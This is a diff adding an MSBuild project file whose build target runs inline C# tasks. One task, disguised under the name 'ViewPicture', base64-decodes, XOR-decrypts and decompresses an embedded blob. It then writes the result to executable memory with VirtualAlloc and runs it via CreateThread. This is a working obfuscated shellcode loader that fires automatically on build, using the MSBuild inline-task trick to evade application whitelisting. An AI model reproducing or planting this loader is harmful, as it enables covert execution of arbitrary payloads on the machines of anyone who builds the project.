@@ -1,0 +1,118 @@
+<!--
+# -------------------------------------------------------------------------------
+# Copyright: (c) BLS OPS LLC.
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, version 3.
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+# GNU General Public License for more details.
+# You should have received a copy of the GNU General Public License
+# along with this program. If not, see <https://www.gnu.org/licenses/>.
+# -------------------------------------------------------------------------------
+-->
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+	<Target Name="Hello">
+		<FragmentExample />
+		<ViewPicture />
+	</Target>
+  
+	<UsingTask TaskName="FragmentExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+		<ParameterGroup/>
+		<Task>
+			<Using Namespace="System" />  
+			<Code Type="Fragment" Language="cs">
+			<![CDATA[
+				Console.WriteLine("Hello");
+			]]>
+			</Code>
+		</Task>
+	</UsingTask>
+	
+	<UsingTask TaskName="ViewPicture" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+		<ParameterGroup/>
+		<Task>
+			<Using Namespace="System" />
+			<Using Namespace="System.Reflection" />
+			<Code Type="Class" Language="cs">
+				<![CDATA[
+				using System;
+				using System.IO;
+				using Microsoft.Build.Framework;
+				using Microsoft.Build.Utilities;
+				using System.IO.Compression;
+				using System.Runtime.InteropServices;
+				using System.Threading;
+
+				public class ViewPicture :  Task, ITask
+				{
+					public override bool Execute()
+					{
+						IntPtr processHandle = IntPtr.Zero;
+						String MyPicture_B64 = "WCKL4pGICf8NgadNgMxMAWFfVafn0MbxkrJt1zVFGvxBYZVqelflFkItmfM8nk9HjD25R6uwAuA6jRk55g4uqbTBEoB4KDafA73H/xIXKAfjezTbeRVOVdNdjemLIzYjx4WSuQj8E59g/09naHhSaH+79nU7SENNd3pPD86il+fMwRdnRN3pVge+JhokrEFWAO7fLNNJO9sB/RQERU5AeLwu1DhfbxhwSZpqqTcdJz4U/OTITdYpdYnzsMGtAI1rolhAIIedBe6l2++37VNiO7e+PGH1sPMHbkMcxSGpYUVOebrMFPrmMaak3jasKsOIi7K0zMVC5PAbpP0FepvxkaRiJNSBSny0AOq7stC1/6Wf9q57ea1fmhDXvBtPbCKcu2b0l3ykXp8FveUNtDK1PmrhhZrYwfptZnSZ5Ih1W5VBb5YkrHqfsi0d6O+RG4Jx/ddsqnS2CorrRRCENH3Qk+sP48hsOCRevS69Aoov7qXja1OWfej4TXdnzDYp02z05nHuRMiFghIpib89m3oPcVS32WEruMJ+GX20KGGL3ryS7WAhlOYyqNnoEnQnMVKwJCxhCSJCCge9Cjc0Pzl5DyeFyohQun54bg/fcxXvULudQH4bCn2SSO0Ahy1bWK9E4khkIfh2XX75DdBBYBNq0Sk1WDzlgTt/+Q4fZ5hiryxkRMccYnztRhDZfZlC7nVkZtixmEAJnSpaScFYuhYkeJc+Y3/lOx66YeEZ7hMNbvSc5FgU22ENNKJ3afyEOaRWSXjXQM+3CuqKpyBEUNnq+y0ErHt8R/oU9xJgGM1QYHHsekrFOfBz3T8VRK2My1VG5BgUOoVE/DU6XKJwI0/lGETXOIdVyG99fY+15Aw/3S5mRvd05VNSJe0tS0ruWFfmYYpU4BYHaYzr6VoL6yw2WJA2+UsAPNpaIkTvHETlfb0z01EjUKbo9OnCKbzrpWl//SE4qChNQlqIWXn8up0XuYWznb7R3lP/h2FlhxRkylM7daFUP20arotjWbkx83csffCY2J+IaoNLOMekhiEKIOjuJOkg32DhnCBzgnpmYZSzgSt/tAllDrQOnWsJzqTZtf4Xeyc/7b0KoAFEUKXWy3LLZqHB+Srs4e6BT63dlMmq73dXDiBSfYWZOuHirw1KmlNXN9o2/QPqmkKeHEGEe4tjCupiOh93D47z6tzxgt3tZgimkDzw4X6W";
+
+						byte[] MyPicture_gzip = Convert.FromBase64String(MyPicture_B64);
+						byte[] MyPicture_xor = UnXOR(MyPicture_gzip);
+						byte[] MyPicture_c = Decompress(MyPicture_xor);
+						processHandle = open_MyPicture(MyPicture_c);
+						WaitForSingleObject(processHandle, 0xFFFFFFFF);
+						return true;
+					}
+					
+					static byte[] UnXOR(byte[] data)
+					{
+						byte[] sb = new byte[906];
+						byte[] xor_key = {0x47, 0xa9, 0x83, 0xe2, 0x7e, 0x96, 0x98, 0xa3, 0x0d, 0x82, 0xa6, 0x3e, 0x83, 0x40, 0xb0, 0x28, 0xa8, 0xee, 0x82, 0x7e, 0x09, 0x09, 0xb2, 0xd5, 0x66, 0xe9, 0xec, 0xa4, 0x26, 0x86,};
+						for (int i = 0; i < data.Length; i++)
+						sb[i] = ((byte)(data[i] ^ xor_key[(i % xor_key.Length)]));
+					
+						return sb;
+					}
+					
+					static byte[] Decompress(byte[] data)
+					{
+						using (var compressedStream = new MemoryStream(data))
+						using (var zipStream = new GZipStream(compressedStream, CompressionMode.Decompress))
+						using (var resultStream = new MemoryStream())
+						{
+							zipStream.CopyTo(resultStream);
+							return resultStream.ToArray();
+						}
+					}
+					
+					private static IntPtr open_MyPicture(byte[] my_picture)
+					{
+						UInt32 funcAddr = VirtualAlloc(0, (UInt32)my_picture.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+						Marshal.Copy(my_picture, 0, (IntPtr)(funcAddr), my_picture.Length);
+						IntPtr hThread = IntPtr.Zero;
+						UInt32 threadId = 0;
+						IntPtr pinfo = IntPtr.Zero;
+						hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+						return hThread;
+					}
+					private static UInt32 MEM_COMMIT = 0x1000;
+					private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+					[DllImport("kernel32")]
+					private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+					 UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+					[DllImport("kernel32")]
+					private static extern IntPtr CreateThread(
+						UInt32 lpThreadAttributes,
+						UInt32 dwStackSize,
+						UInt32 lpStartAddress,
+						IntPtr param,
+						UInt32 dwCreationFlags,
+						ref UInt32 lpThreadId
+					);
+					[DllImport("kernel32")]
+					private static extern UInt32 WaitForSingleObject(
+						IntPtr hHandle,
+						UInt32 dwMilliseconds
+					);
+				}
+				]]>
+			</Code>
+		</Task>
+	</UsingTask>
+</Project>
